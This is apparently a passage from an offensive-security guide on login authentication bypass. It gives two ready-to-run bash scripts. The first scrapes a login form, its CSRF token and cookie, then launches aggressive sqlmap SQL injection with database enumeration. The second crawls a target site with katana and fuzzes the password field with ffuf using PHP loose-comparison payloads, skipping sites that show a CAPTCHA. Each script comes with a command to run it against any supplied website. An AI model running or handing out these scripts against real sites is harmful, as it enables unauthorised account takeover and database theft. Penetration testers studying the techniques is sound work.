# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Ffiles
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""

HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=12341234@"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers - Define directly in sqlmap format (name: value)
SQLMAP_HEADERS="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,fa-IR;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: $URL
Sec-GPC: 1
Connection: keep-alive
Referer: $LOGIN
Upgrade-Insecure-Requests: 1
Priority: u=0, i"

# Run SQLMAP
if [[ "$METHOD" == "get" ]]; then
    SQLMAP_URL="${FULL_ACTION}?${DATA}"
    sqlmap -u "$SQLMAP_URL" \
           --headers="$SQLMAP_HEADERS" \
           --cookie="$COOKIES" \
           --batch --level=5 --risk=3 -v 3 \
           --random-agent --threads=10 \
           --tamper=space2comment,randomcase \
           --not-string="invalid\|incorrect\|failed\|error\|denied" \
           --dbs --banner --current-user --current-db --is-dba

else
    sqlmap -u "$FULL_ACTION" \
           --data="$DATA" \
           --headers="$SQLMAP_HEADERS" \
           --cookie="$COOKIES" \
           --batch --level=5 --risk=3 -v 3 \
           --random-agent --threads=10 \
           --tamper=space2comment,randomcase \
           --not-string="invalid\|incorrect\|failed\|error\|denied" \
           --dbs --banner --current-user --current-db --is-dba
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x auth-bypass-sqli.sh;sudo ./auth-bypass-sqli.sh $WEBSITE
```

### PHP Loose Comparison <a href="#php-loose-comparison" id="php-loose-comparison"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano auth-bypass-tj.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
DEPS="git curl golang ffuf"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Install Katana
if ! command -v katana &>/dev/null; then
    color_print GREEN "[*] Installing katana ..."
    go env -w GO111MODULE=on
    go env -w GOPROXY=https://goproxy.cn,direct
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
fi

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    echo "[!] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
    echo "[!] CAPTCHA detected on login page."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Ffiles
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""

HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=top_admin&${PASSWORD_FIELD}=FUZZ"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers
HEADERS=(
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Auth Bypass Header
payload_list="/tmp/payloads.txt"
cat > $payload_list << EOF
0
0e0
0e12345
0e215962017
0e11111111
0e1294123
null
NULL
true
false
"0"
"0e0"
"null"
[]
{}
EOF

# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$payload_list:FUZZ" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$payload_list:FUZZ" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x auth-bypass-tj.sh;sudo ./auth-bypass-tj.sh $WEBSITE
```
